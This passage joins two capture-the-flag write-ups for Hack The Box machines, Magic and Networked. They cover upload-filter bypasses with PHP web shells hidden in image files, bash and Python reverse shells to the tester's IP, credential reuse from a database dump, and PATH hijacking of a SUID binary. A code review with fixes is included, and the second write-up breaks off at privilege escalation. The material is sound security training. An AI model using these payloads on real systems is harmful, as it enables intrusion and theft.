|_  Supported Methods: GET HEAD POST OPTIONS                                         
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 
....
```

We have two ports open.

* **Port 22:** running OpenSSH 7.6p1
* **Port 80:** running Apache httpd 2.4.29

Before we move on to enumeration, let’s make some mental notes about the scan results.

* The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that we gain initial access through this port, unless we find credentials.
* Port 80 is running a web server. AutoRecon by default runs gobuster and nikto scans on HTTP ports, so we’ll have to review them. Since this is the only other port that is open, it is very likely to be our initial foothold vector.

### Enumeration <a id="fe35"></a>

Visit the application in the browser.

![Image for post](https://miro.medium.com/max/914/1*Pj5AuiuvSXALBDfRDcpnUA.png)

Viewing the page source doesn’t give us any useful information. Next, view Autorecon’s gobuster scan.

```text
root@kali:~/# cat tcp_80_http_gobuster.txt | grep -v 403
/assets (Status: 301) [Size: 313]
/images (Status: 301) [Size: 313]
/index.php (Status: 200) [Size: 5069]
/index.php (Status: 200) [Size: 5067]
/login.php (Status: 200) [Size: 4221]
/logout.php (Status: 302) [Size: 0]
/upload.php (Status: 302) [Size: 2957]
```

Right off the bat, I see something that could potentially be very concerning. The _upload.php_ & _logout.php_ pages are internal pages \(require authentication\) that lead to a 302 redirect when a user attempts to access them. However, the interesting part is the response size. The _upload.php_ response size is much larger than what a normal 302 redirect response would be. So if I had to guess, the PHP script is not properly terminated after user redirection, which could give us unrestricted access to any internal page in the application.

We can confirm this using Burp proxy. Visit the _upload.php_ script and intercept the traffic in Burp. As can be seen in the below image, before the request is redirected to the login page, we are served with the upload page.

![Image for post](https://miro.medium.com/max/1190/1*MkxcNYDWbsJIBR_Y0KbCIw.png)

Now all we have to do is change the HTTP Status Code from “_302 Found_” to “_200 OK_” and we get access to the upload page. To have Burp automatically do that for you, visit the _Proxy_ &gt; _Options_ tab. In the _Match and Replace_ section, set the following options.

![Image for post](https://miro.medium.com/max/764/1*0SYDqCLN6oZGVVRyEqGIbg.png)

Now visiting the _upload.php_ page in the browser does not redirect to the _login.php_ page.

![Image for post](https://miro.medium.com/max/905/1*H50u6PpY-PgxLH7Jye-ERQ.png)

An improperly implemented upload functionality could potentially give us code execution on the box. However, that would require two conditions:

1. Being able to upload a shell on the box
2. Being able to call and execute that shell

Even if I could upload PHP code, it’s not much use if I can’t call it. So let’s upload a JEPG image and see if we can call it through the web server.

![Image for post](https://miro.medium.com/max/439/1*fQkl3nMEdYZFtGldZuq1yA.png)

We get a file has been uploaded message. Visiting the root directory, we see that our image is included in the slide show.

![Image for post](https://miro.medium.com/max/1188/1*YowvW6AK8RunmXo6Hdmu2A.png)

Viewing the page source gives us the path to the image.

![Image for post](https://miro.medium.com/max/577/1*Qiokb885rKy-YnTEUjLsFw.png)

Good. So we do have a way to call the image. Now all we need to do is figure out a way to bypass file upload restrictions to upload PHP code.

### Initial Foothold <a id="1894"></a>

Try and upload a file with a “_.php_” extension.

![Image for post](https://miro.medium.com/max/383/1*mLTSoAhoR7wKrQcilk7iEw.png)

We get the above message indicating that there are backend restrictions on the file extension. Next, try and upload a file with the extension “_.php.jpeg_”.

![Image for post](https://miro.medium.com/max/292/1*fpjf6ryaqMXRnPd4vKdUvQ.png)

We get a different error message. So we bypassed the extension restriction, but we’re now faced with another restriction. My guess is it is checking the mime type of the file. To bypass that, we’ll use exiftool to add PHP code to our cat image.

```text
exiftool -Comment='<?php system($_GET['cmd']); ?>' cat.jpeg
```

This adds a parameter to the GET request called _cmd_ that we’ll use to get code execution. View the type of the file.

```text
root@kali:~# file cat.php.jpeg 
cat.php.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: "<?php system(['cmd']); ?>", baseline, precision 8, 121x133, components 3
```

The file is still a JPEG image, so it should bypass MIME type restrictions. Upload the file.

![Image for post](https://miro.medium.com/max/458/1*6opCjWPpvwzECZlO_jtevA.png)

Perfect! Now call the file with the cmd parameter to confirm that we have code execution.

![Image for post](https://miro.medium.com/max/716/1*RwSnu0EU86R0a3ZbEvt-Xw.png)

We have code execution! Now, let’s get a reverse shell. First, set up a listener on the attack machine.

```text
nc -nlvp 443
```

Then run the request again and send it to _Repeater._ Next, visit [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and add the bash reverse shell in the ‘_cmd_’ parameter.

```text
bash -c 'bash -i >& /dev/tcp/10.10.14.171/443 0>&1'
```

Make sure to URL encode it before you send the request \(Ctrl + U\).

![Image for post](https://miro.medium.com/max/659/1*NPkw2rnthUK6a2_-MY1NJw.png)

We get a shell! Let’s upgrade it to a better shell.

```text
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell. To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “_fg_” to bring netcat back to the foreground. Then use the following command to give the shell the ability to clear the screen.

```text
export TERM=xterm
```

Unfortunately, we’re running as the web daemon user _www-data_ and we don’t have privileges to view the _user.txt_ flag. Therefore, we need to escalate our privileges.

### Privilege Escalation <a id="a004"></a>

Going through the web app files, we find database credentials in the _db.php5_ file.

```text
www-data@ubuntu:/var/www/Magic$ cat db.php5
...
private static $dbName = 'Magic' ;
private static $dbHost = 'localhost' ;
private static $dbUsername = 'theseus';
private static $dbUserPassword = 'iamkingtheseus';
...
```

Let’s check if _theseus_ is a user on the system.

```text
www-data@ubuntu:/var/www/Magic$ cat /etc/passwd
...
theseus:x:1000:1000:Theseus,,,:/home/theseus:/bin/bash
...
```

He is. Let’s see if he reused his database credentials for his system account.

```text
www-data@ubuntu:/var/www/Magic$ su theseus
Password: 
su: Authentication failure
```

Doesn’t work. The next thing to try is logging into the database with the credentials we found.

![Image for post](https://miro.medium.com/max/458/1*Ox4w5IsepoJU-Fx5IazDqg.png)

We can see that _mysqldump_ is installed on the box, which we’ll use to dump the database.

```text
www-data@ubuntu:/usr/bin$ mysqldump --databases Magic -utheseus -piamkingtheseus
...
--
-- Dumping data for table `login`
--LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
...
```

Try the credentials we found on the _theseus_ account.

```text
www-data@ubuntu:/usr/bin$ su theseus   
Password: 
theseus@ubuntu:/usr/bin$
```

We’re in! View the _user.txt_ flag.

![Image for post](https://miro.medium.com/max/453/1*zpXdp_gjkARNlAXoXqUjqg.png)

Now we need to escalate our privileges to root. I downloaded the _LinEnum_ script and ran it. It looks like the SUID bit is set for the _sysinfo_ program, which means that the program runs with the privileges of the owner of the file.

```text
/bin/sysinfo
```

Let’s run _strings_ on the program to see what it’s doing.

```text
theseus@ubuntu:/usr/include/x86_64-linux-gnu/sys$ strings /bin/sysinfo
...
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
...
```

We can see that it runs the _fdisk_ & _lshw_ programs without specifying the full path. Therefore, we could abuse that to our advantage and have it instead run a malicious _fdisk_ program that we control.

In the _tmp_ folder \(which we have write access to\), create an _fdisk_ file and add a python reverse shell to it.

```text
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.171",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Give it execute rights.

```text
chmod +x fdisk
```

Set the path directory to include the _tmp_ directory.

```text
PATH=/tmp:$PATH
```

This way when we run the _sysinfo_ program, it’ll look for the _fdisk_ program in the _tmp_ directory and execute our reverse shell.

Setup a netcat listener to receive the reverse shell.

```text
nc -nlvp 7777
```

Then run the _sysinfo_ command.

```text
sysinfo
```

We get a shell!

![Image for post](https://miro.medium.com/max/528/1*4lzS3H0nT6FXgcl21HGWDQ.png)

Upgrade the shell and get the _root.txt_ flag

![Image for post](https://miro.medium.com/max/414/1*x4HvgMZr8D1EzkwWzatvvw.png)

## Automated Scripts <a id="1d63"></a>

This section automates the web application attack vector\(s\) of the box. I’ve written the code in such a way that it should be easily read, therefore, I won’t go into explaining it here.

The script automates the initial foothold vector for this box and can be found on my [GitHub page](https://github.com/rkhal101/Hack-the-Box-OSWE-Preparation/blob/master/linux-boxes/magic/htb-magic-exploit.py). Refer to the _Usage Instructions_ in the main method for instructions on how to run the script.

![Image for post](https://miro.medium.com/max/1382/1*U0Fns-gUfvopfZlNaPqELQ.png)

## Secure Code Review <a id="7cb9"></a>

This section dives into the code to find out what portion\(s\) of the code introduced the vulnerabilities.

### Setup <a id="7369"></a>

Zip the _www_ directory.

```text
zip -r www.zip www/
```

Start a python server on the target machine.

```text
python3 -m http.server
```

Download the zipped file on the target machine.

```text
wget http://10.10.10.185:8000/www.zip
```

Unzip the file.

```text
unzip www.zip 
```

**Note:** I have uploaded the [code on GitHub](https://github.com/rkhal101/Hack-the-Box-OSWE-Preparation/tree/master/linux-boxes/magic/source-code).

### Code Review <a id="bc0c"></a>

We observed two vulnerabilities while testing the web application.

1. Improper redirection
2. Insecure file upload functionality.

Both vulnerabilities were discovered in the _upload.php_ page, so we’ll start with that page.

**Vuln \#1: Improper Redirection**

Lines 2–6 of the _upload.php_ script handle the redirection functionality.

![Image for post](https://miro.medium.com/max/580/1*LhT2qQpbruKWlq_A3hF22A.png)

The following is an overview of the code:

* **Line 2:** Calls the [_session\_start_](https://www.php.net/manual/en/function.session-start.php#:~:text=session_start%28%29%20creates%20a%20session,and%20read%20session%20save%20handlers.) function which creates a session or resumes the current one based on a session identifier passed via a GET or POST request, or passed via a cookie.
* **Lines 4–6:** Call the [_isset_](https://www.php.net/manual/en/function.isset.php) function to check whether the user is logged in or not. This is done by checking if the user\_id index of the global $\_SESSION variable evaluating to anything other than null. If the user is not logged in, the [_header_](https://www.php.net/manual/en/function.header.php) function gets called which redirects the user to the login page.

Before we dive into why this code is vulnerable, it’s worth looking at how sessions are created on the server-side.

Sessions are saved in the following folder on the system. In the below image, the first session \(_sess\_6aen…_\) was created by logging into the application using a valid username/password. Therefore, the size of the image is larger than zero b/c it contains session information. Whereas, the second session \(_sess\_tkas..._\) was created by navigating to the _upload.php_ script w/o logging in. Therefore, although the session got created, it does not contain any information.

![Image for post](https://miro.medium.com/max/695/1*QQEyRrl5O0TUgFoxBx8-nA.png)

Viewing the content of the first session we see the user id is associated to a value and therefore when the _isset_ function is called, it evaluates to true which skips the redirection to the login page.

```text
root@ubuntu:/var/lib/php/sessions# cat sess_6aengltqst8pck0jccrlkgmb8h user_id|s:1:"1";
```

Why is this code vulnerable? Notice that when a user does not have a valid session id, the user is redirected but any code after line \#6 is still rendered in the HTTP response before the redirect. That’s why when we stopped the redirection in the proxy, we were able to see the upload functionality.

To make this really clear, we can write a small [PHP script](https://github.com/rkhal101/Hack-the-Box-OSWE-Preparation/tree/master/linux-boxes/magic/examples) that redirects to another page if a session is not valid.

```text
root@kali:~/Desktop/temp# cat page1.php 
<?php
// page1.php
session_start();                                                                  if (!isset($_SESSION['user_id'])) {                                                  
    header("Location: page2.php");                                                   
}                                                                                                                                                                                                                                                           
echo 'Welcome to page #1';
?>root@kali:~/Desktop/temp# cat page2.php 
<?php
// page2.php
session_start();
echo 'Welcome to page #2';
?>
```

To test the code, setup a PHP server.

```text
php -S 127.0.0.1:8888
```

Then visit page 1 in the browser. This automatically redirects you to page 2.

![Image for post](https://miro.medium.com/max/466/1*Gs3ZKV_PPPBtjrqoZ_FRLQ.png)

However, if we see the request in the proxy, we can see that before it redirects the user, the code in page 1 is rendered.

![Image for post](https://miro.medium.com/max/1286/1*gSDYjPO0XVJCUsk7ZFPLgw.png)

The way to fix this vulnerability is simply to add the _die\(\)_ or _exit\(\)_ functions after the _Location_ header. This makes sure that the code below the function does not get executed when redirected.

Therefore, to fix the vulnerability, make the following change to _page1.php_.

```text
root@kali:~/Desktop/temp# cat page1-fix.php 
<?php
// page1.php
session_start();
if (!isset($_SESSION['user_id'])) {
        header("Location: page2.php");
        exit();
}
echo 'Welcome to page #1';
?>
```

Now when you visit page 1 in the browser, you automatically get redirected to page 2 but anything after the exit function is no longer rendered.

![Image for post](https://miro.medium.com/max/1263/1*8A4jCyQV7vdg9t3ittUAUg.png)

**Vuln \#2: Insecure File Upload Functionality**

Lines 7–44 describe the upload functionality. We can see that there are two validation checks that are being performed, the first one checks the file format and the second checks the file type using magic bytes.

![Image for post](https://miro.medium.com/max/791/1*0KAkNGmCuV_UAO7WIexd6A.png)

Let’s dive into the first validation check. Lines 14–19 verify if the file format is anything other than JPG, PNG & JPEG.

![Image for post](https://miro.medium.com/max/774/1*0kF07b1V8rIrZk9_U1OyNA.png)

The following is an overview of the code:

* **Line 15:** Calls ****the [_pathinfo_](https://www.php.net/manual/en/function.pathinfo.php) function which takes in the uploaded file and uses the option _PATHINFO\_EXTENSION_ to strip out the extension of the file and save it in the variable _imageFileType_. The thing to note about this option is that if the file has more than one extension, it strips the last one.
* **Lines 16–18:** Checks if the file extension is one of the three: _jpg_, _png_ & _jpeg_. If not, it outputs an alert and the file upload fails.

How can we bypass this validation check? Since the _PATHINFO\_EXTENSION_ option only strips out the last extension, if the file has more than one extension, we could simply name the file “_test.php.png_”. When the filename passes through this validation check, it outputs that the file extension is _png._

The next validation check being performed is on Lines 21–28 which verifies that the image is actually a png or jepg using magic bytes.

![Image for post](https://miro.medium.com/max/726/1*N-mziY36uj81qO0C3Q9K8A.png)

The following is an overview of the code:

* **Line 23:** Calls the [_exif\_imagetype_](https://www.php.net/manual/en/function.exif-imagetype.php) function which takes in the uploaded file and reads the first bytes of an image and checks its signature. When a correct signature is found, the appropriate constant value will be returned \(1 for GIF, 2 for JPEG, 3 for PNG, etc.\), otherwise the return value is False.
* **Lines 23–27:** Use the _in\_array_ function to see if the constant value outputted from the _exif\_imagetype_ function exists in the array of the allowed values which was initialized at the beginning of the script to 2 & 3. Therefore, this validation check only accepts signatures for JPEG and PNG images.

How can we bypass this validation check? Since the _exif\_imagetype_ function only reads the first bytes of the image to check the signature, we can simply add a malicious script to an existing JPEG or PNG file like we did with exiftool.

The remaining lines of the code upload the file in the directory _images/uploads_ if the file passed the above two validation checks.

![Image for post](https://miro.medium.com/max/775/1*ucpWOmHnSPRfdjy90_-9ew.png)

How do you fix this vulnerability? Ideally you would use a third party service that offers enterprise security with features such as antivirus scanning to manage the file upload system. However, if that option is not possible, the [OWASP guide](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) has a list of prevention methods to secure file uploads. These include but are not limited to, the use a virus scanner on the server, consider saving the files in a database instead of a filesystem, or if a filesystem is necessary, then on an isolated server and ensuring that the upload directory does not have any execute permissions.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
networked-writeup-w-o-metasploit.md
# Networked Writeup w/o Metasploit

![](https://miro.medium.com/max/579/1*XeX7LkiBHJjLCyF7ITRECw.png)

## Reconnaissance <a id="e44c"></a>

Run the [nmapAutomator](https://github.com/21y4d/nmapAutomator) script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.146 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.146
                                                                                               
Host is likely running Linux---------------------Starting Nmap Quick Scan---------------------
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-12 09:52 EST
Nmap scan report for 10.10.10.146
Host is up (0.032s latency).
Not shown: 997 filtered ports, 1 closed port
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 5.31 seconds---------------------Starting Nmap Basic Scan---------------------
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-12 09:52 EST
Nmap scan report for 10.10.10.146
Host is up (0.029s latency).PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.20 seconds----------------------Starting Nmap UDP Scan----------------------
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-12 09:53 EST
Warning: 10.10.10.146 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.146
Host is up (0.035s latency).
All 1000 scanned ports on 10.10.10.146 are open|filtered (949) or filtered (51)Nmap done: 1 IP address (1 host up) scanned in 46.05 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-12 09:53 EST
.....
Nmap scan report for 10.10.10.146
Host is up (0.042s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
443/tcp closed httpsRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 370.20 seconds
           Raw packets sent: 130978 (5.763MB) | Rcvd: 233 (16.688KB)No new ports---------------------Starting Nmap Vulns Scan---------------------
                                                                                               
Running CVE scan on basic ports
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-12 09:59 EST
Nmap scan report for 10.10.10.146
Host is up (0.035s latency).PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
| vulners: 
|   cpe:/a:apache:http_server:2.4.6: 
|_      CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.40 secondsRunning Vuln scan on basic ports
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-12 10:00 EST
Nmap scan report for 10.10.10.146
Host is up (0.033s latency).PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:openbsd:openssh:7.4: 
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|_      CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /backup/: Backup folder w/ directory listing
|   /icons/: Potentially interesting folder w/ directory listing
|_  /uploads/: Potentially interesting folder
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:apache:http_server:2.4.6: 
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
.....Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.56 seconds---------------------Recon Recommendations----------------------Web Servers Recon:
                                                                                               
gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.146:80 -o recon/gobuster_10.10.10.146_80.txt
nikto -host 10.10.10.146:80 | tee recon/nikto_10.10.10.146_80.txtWhich commands would you like to run?                                                          
All (Default), gobuster, nikto, Skip <!>Running Default in (1) s:---------------------Running Recon Commands----------------------Starting gobuster scan
                                                                                               
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.146:80
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/01/12 10:01:19 Starting gobuster
===============================================================
http://10.10.10.146:80/.hta (Status: 403) [Size: 206]
http://10.10.10.146:80/.hta.html (Status: 403) [Size: 211]
http://10.10.10.146:80/.hta.php (Status: 403) [Size: 210]
http://10.10.10.146:80/.htpasswd (Status: 403) [Size: 211]
http://10.10.10.146:80/.htpasswd.html (Status: 403) [Size: 216]
http://10.10.10.146:80/.htpasswd.php (Status: 403) [Size: 215]
http://10.10.10.146:80/.htaccess (Status: 403) [Size: 211]
http://10.10.10.146:80/.htaccess.html (Status: 403) [Size: 216]
http://10.10.10.146:80/.htaccess.php (Status: 403) [Size: 215]
http://10.10.10.146:80/backup (Status: 301) [Size: 235]
http://10.10.10.146:80/cgi-bin/ (Status: 403) [Size: 210]
http://10.10.10.146:80/cgi-bin/.html (Status: 403) [Size: 215]
http://10.10.10.146:80/index.php (Status: 200) [Size: 229]
http://10.10.10.146:80/index.php (Status: 200) [Size: 229]
http://10.10.10.146:80/lib.php (Status: 200) [Size: 0]
http://10.10.10.146:80/photos.php (Status: 200) [Size: 1302]
http://10.10.10.146:80/upload.php (Status: 200) [Size: 169]
http://10.10.10.146:80/uploads (Status: 301) [Size: 236]
===============================================================
2020/01/12 10:01:59 Finished
===============================================================Finished gobuster scan
                                                                                               
=========================
                                                                                               
Starting nikto scan
                                                                                               
- Nikto v2.1.6
--------------------------------------------------------------------
+ Target IP:          10.10.10.146
+ Target Hostname:    10.10.10.146
+ Target Port:        80
+ Start Time:         2020-01-12 10:02:00 (GMT-5)
--------------------------------------------------------------------
+ Server: Apache/2.4.6 (CentOS) PHP/5.4.16
+ Retrieved x-powered-by header: PHP/5.4.16
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/5.4.16 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3268: /backup/: Directory indexing found.
+ OSVDB-3092: /backup/: This might be interesting...
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8673 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2020-01-12 10:08:14 (GMT-5) (374 seconds)
--------------------------------------------------------------------
+ 1 host(s) testedFinished nikto scan
                                                                                               
=========================
                                                                                                                                                                            
                                                                                               
---------------------Finished all Nmap scans---------------------
```

Before we move on to enumeration, let’s make some mental notes about the scan results. We have 2 open ports:

* **Port 22:** running OpenSSH 7.4
* **Port 80:** running Apache httpd 2.4.6

Let’s look at each port individually.

**Port 22**

* The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that we gain initial access through this port, unless we find credentials.

**Port 80**

* The nmap/gobuster/nikto scans on this web server showed several promising directories/files: /backup, /icons, /uploads, index.php, lib.php, photos.php, uploads.php, /icons/README.

## Enumeration <a id="9b54"></a>

Visit the application in the browser.

![](https://miro.medium.com/max/577/1*XrxMSsDJ55SBU2ZahS8XJQ.png)

View page source to see if we get any extra information.

![](https://miro.medium.com/max/496/1*EUoCYnMU4QVrJybfOA8iew.png)

There’s a comment mentioning an upload and gallery pages that have not yet been linked to the index page. We found those pages during the gobuster scan.

Visit the _upload_ page.

![](https://miro.medium.com/max/491/1*qjJYSMXwh5sQ4ZhUxlFRqQ.png)

It gives you the option of uploading files. We’ll have to test what type of files can be uploaded. The web server can run php code, so we’ll have to check if it accepts _.php_ files. Maybe we can upload a php shell on the server.

Next, visit the _photos_ page. It contains a bunch of images. The images that get uploaded on the _upload_ page, are presented on this page.

![](https://miro.medium.com/max/1002/1*hTtJzHkBB0hnpb_R66rUFA.png)

View page source to see the link to each image.

![](https://miro.medium.com/max/850/1*0ZIihOYZmkudPDOJKzorVg.png)

So not only do we have a way of uploading files on the web server, but we can also execute those files. In most cases, restrictions are put in place preventing us from uploading any file. Therefore, we’ll need to first enumerate these restrictions and then figure out a way to bypass them.

Next, view the backup directory. It contains a compressed file.

![](https://miro.medium.com/max/628/1*e-qxp_U5hjLf1Gg3phTxhA.png)

Download the file and decompress it.

```text
tar -C backup/ -xvf backup.tar
```

* **-C:** directory where files will be saved.
* **-xvf:** extract files and list files that have been extracted.

It contains the source code of the php scripts running on the web server. This is great for us, because we can simply look at the php scripts in order to determine the validation that is put in place for uploading files.

## **Initial Foothold** <a id="c527"></a>

Let’s view the _upload.php_ script. It takes in the uploaded file and performs two validation checks on it.

```text
....// First validation check
if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }....// Second validation check
list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }
```

Let’s describe the second validation check first. It takes in an array of allowed file extensions and checks if the uploaded file contains that extension. The check is being performed using the [_substr\_compare\(\)_](https://www.php.net/manual/en/function.substr-compare.php) function. This is a function that is used to compare two strings.

```text
substr_compare ( string $main_str , string $str , int $offset)
```

It requires at least three parameters:

1. **$main\_str:** the main string being compared.
2. **$str:** the secondary string being compared.
3. **$offset:** the start position for the comparison. If negative, it starts counting from the end of the string.

The following is an example.

```text
substr_compare ( test.png , .png, -4)
```

Since the offset in the above example is negative, it starts at the end of the string “test.png” and checks every character with the characters in the string “.png” \(4 characters\). In this case the test would pass and the function outputs a zero. This is exactly what the upload script is doing. Therefore, in order to bypass that, all we have to do is upload a file with a valid extension at the end. For example: test.php.png.

Let’s move on to the first validation check. The script calls the _check\_file\_type\(\)_ function from the _lib.php_ file. This in turn calls the _file\_mime\_type\(\)_ function to determine the mime type of the file. Then the mime type is checked to see if it contains the string ‘image/’ in it.

```text
function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }  
}
```

This can be easily bypassed because we can simply include what is known as [magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) in our file in order to trick the script into thinking the file is an image. This can be be done by adding the string “GIF87a” to the file.

Alright, we know how to bypass both validation checks, so we’re ready to run our exploit.

Create a file called _test.php.png_ and add the the following code to it.

```text
GIF87a                                                                                                                                                                         
<?php system($_GET['cmd']); ?>
```

The first line tricks the application into thinking it is an image and the second line adds a parameter to the get request called _cmd_. Upload the file and intercept the request in Burp.

![](https://miro.medium.com/max/694/1*FNs7nj2_FhzuLWTsVvo4ZA.png)

As can be seen, the request identified it as an image. Send the request and visit the _photos_ page.

![](https://miro.medium.com/max/1176/1*R0X7BcN13VvuUWj2v81jLw.png)

We can see that our image has been uploaded. Right click and select _View Image_. This executes our code. Next, add the _cmd_ parameter to the URL and run the _whoami_ command.

![](https://miro.medium.com/max/690/1*ZEnOAi-k21jM9z9VvG1iTw.png)

We have code execution! Now, let’s get a reverse shell. First, set up a listener on the attack machine.

```text
nc -nlvp 1234
```

Then run the _whoami_ request again and send it to _Repeater._ You will have to disable the “File extension” in _Proxy_ &gt; _Options_ &gt; _Intercept Client Requests_ in order to intercept the request.

Next, visit [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and add the bash reverse shell in the ‘_cmd_’ parameter.

```text
bash -c 'bash -i >& /dev/tcp/10.10.14.12/1234 0>&1'
```

Make sure to URL encode it before you send the request \(Ctrl + U\).

![](https://miro.medium.com/max/763/1*l2rqNKH-wB3YvkbElAG34g.png)

We get a shell! Let’s upgrade it to a better shell.

```text
python -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell. To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “fg” to bring netcat back to the foreground. Then use the following command to give the shell the ability to clear the screen.

```text
export TERM=xterm
```

Unfortunately, we’re running as the web daemon user _apache_ and we don’t have privileges to view the user.txt flag. Therefore, we need to escalate our privileges.

## Privilege Escalation <a id="eb18"></a>

The _user.txt_ flag is in the home directory of the user _guly_. So we’ll either have to escalate our privileges to _guly_ or _root_.

